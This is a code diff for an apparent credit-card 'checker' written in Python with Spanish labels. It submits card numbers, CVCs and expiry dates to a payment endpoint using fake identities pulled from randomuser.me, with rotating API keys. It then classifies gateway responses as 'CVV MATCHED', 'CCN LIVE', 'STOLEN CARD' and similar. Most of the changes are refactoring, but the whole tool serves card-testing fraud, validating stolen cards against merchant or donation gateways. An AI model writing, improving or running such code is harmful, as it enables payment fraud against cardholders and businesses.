@@ -9,8 +9,8 @@ import json
 import re
 import sys
 import time
+from collections.abc import Awaitable, Callable
 from dataclasses import asdict, dataclass
-from typing import Awaitable, Callable
 
 import httpx
 
@@ -25,9 +25,9 @@ IDENTITY_URL = "https://randomuser.me/api/?nat=us"
 
 # (needle, kind, label) -- el orden importa, no reordenar
 RULES: list[tuple[str, str, str]] = [
+    ("known test card", "info", "TARJETA DE PRUEBA EN MODO LIVE"),
     ('"cvc_check": "pass"', "success", "CVV MATCHED"),
     ("Thank You For Donation.", "success", "CVV MATCHED"),
-    ('"Thank You For Donation."', "success", "CVV MATCHED"),
     ("Thank You.", "success", "CVV MATCHED"),
     ("Your card zip code is incorrect.", "success", "CVV MATCHED"),
     ("/donations/thank_you?donation_number=", "success", "CVV MATCHED"),
@@ -35,7 +35,7 @@ RULES: list[tuple[str, str, str]] = [
     ('"type":"one-time"', "success", "CVV MATCHED - INCORRECT ZIP"),
     ("security code is incorrect.", "info", "CCN LIVE"),
     ("security code is invalid.", "info", "CCN LIVE"),
-    ("Your card&#039;s security code is incorrect.", "info", "CCN LIVE"),
+    ("Your card's security code is incorrect.", "info", "CCN LIVE"),
     ("incorrect_cvc", "info", "CCN LIVE"),
     ('"cvc_check": "fail"', "info", "CCN LIVE"),
     ("stolen_card", "info", "STOLEN CARD"),
@@ -50,7 +50,11 @@ RULES: list[tuple[str, str, str]] = [
     ("card was declined.", "danger", "CARD DECLINED"),
     ("generic_decline", "danger", "GENERIC DECLINE"),
     ("do_not_honor", "danger", "DO NOT HONOR"),
-    ("Your card does not support this type of purchase.", "danger", "PURCHASE NOT SUPPORTED"),
+    (
+        "Your card does not support this type of purchase.",
+        "danger",
+        "PURCHASE NOT SUPPORTED",
+    ),
     ("transaction_not_allowed", "danger", "PURCHASE NOT SUPPORTED"),
     ("processing_error", "danger", "PROCESSING ERROR"),
     ("service_not_allowed", "danger", "SERVICE NOT ALLOWED"),
@@ -65,12 +69,16 @@ RULES: list[tuple[str, str, str]] = [
         "3D SECURE REDIRECT",
     ),
     ("missing_payment_information", "danger", "MISSING PAYMENT INFO"),
-    ("Payment cannot be processed, missing credit card number", "danger", "MISSING CARD NUMBER"),
+    (
+        "Payment cannot be processed, missing credit card number",
+        "danger",
+        "MISSING CARD NUMBER",
+    ),
+    ('"object": "payment_method"', "info", "CCN LIVE"),
     ("-1", "danger", "UPDATE NONCE"),
 ]
 
 CARD_RE = re.compile(r"^\d{12,19}$")
-ICONS = {"success": "✅", "info": "⚠️", "danger": "❌", "unknown": "❓", "dead": "🔑"}
 
 BinLookup = Callable[[str], Awaitable[BinInfo | None]]
 
@@ -111,7 +119,10 @@ class CardData:
 
     @property
     def masked(self) -> str:
-        return f"{self.number[:6]}****{self.number[-4:]}|{self.month}|{self.year}|{self.cvc}"
+        return (
+            f"{self.number[:6]}****{self.number[-4:]}"
+            f"|{self.month}|{self.year}|{self.cvc}"
+        )
 
 
 @dataclass(slots=True)
@@ -142,7 +153,7 @@ def _slice(text: str, start: str, end: str) -> str:
     return text[index:stop].strip() if stop != -1 else text[index:].strip()
 
 
-def _headers(target: Target, key: str, timeout: float) -> dict[str, str]:
+def _headers(target: Target, key: str) -> dict[str, str]:
     headers = {
         "accept": "application/json",
         "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
@@ -156,11 +167,14 @@ def _headers(target: Target, key: str, timeout: float) -> dict[str, str]:
     if target.auth == "bearer":
         headers["authorization"] = f"Bearer {key}"
     elif target.auth == "basic":
-        headers["authorization"] = "Basic " + base64.b64encode(f"{key}:".encode()).decode()
+        token = base64.b64encode(f"{key}:".encode()).decode()
+        headers["authorization"] = f"Basic {token}"
     return headers
 
 
-def _payload(card: CardData, ident: dict[str, str], target: Target, key: str) -> dict[str, str]:
+def _payload(
+    card: CardData, ident: dict[str, str], target: Target, key: str
+) -> dict[str, str]:
     fields = target.fields
     data = {
         fields["type"]: "card",
@@ -168,7 +182,9 @@ def _payload(card: CardData, ident: dict[str, str], target: Target, key: str) ->
         fields["exp_month"]: card.month,
         fields["exp_year"]: card.year,
         fields["cvc"]: card.cvc,
-        fields["name"]: f'{ident.get("firstname", "")} {ident.get("lastname", "")}'.strip(),
+        fields["name"]: (
+            f'{ident.get("firstname", "")} {ident.get("lastname", "")}'.strip()
+        ),
         fields["line1"]: ident.get("street", ""),
         fields["city"]: ident.get("city", ""),
         fields["state"]: ident.get("state", ""),
@@ -213,7 +229,7 @@ async def _post(
         ) as client:
             response = await client.post(
                 target.endpoint,
-                headers=_headers(target, key, timeout),
+                headers=_headers(target, key),
                 data=_payload(card, ident, target, key),
             )
             return response.text, response.status_code
@@ -241,12 +257,16 @@ async def check_card(
     use_identity: bool = True,
 ) -> CheckResult:
     if not target.has_key:
-        return CheckResult(kind="dead", label="SIN CLAVE EN EL TARGET", target=target.name)
+        return CheckResult(
+            kind="dead", label="SIN CLAVE EN EL TARGET", target=target.name
+        )
 
     ring = KeyRing(list(target.keys))
     started = time.perf_counter()
 
-    ident_task = _identity(proxy, timeout) if use_identity else asyncio.sleep(0, result={})
+    ident_task = (
+        _identity(proxy, timeout) if use_identity else asyncio.sleep(0, result={})
+    )
     bin_task = bin_lookup(card.bin) if bin_lookup else asyncio.sleep(0, result=None)
     ident, bin_info = await asyncio.gather(ident_task, bin_task)
 
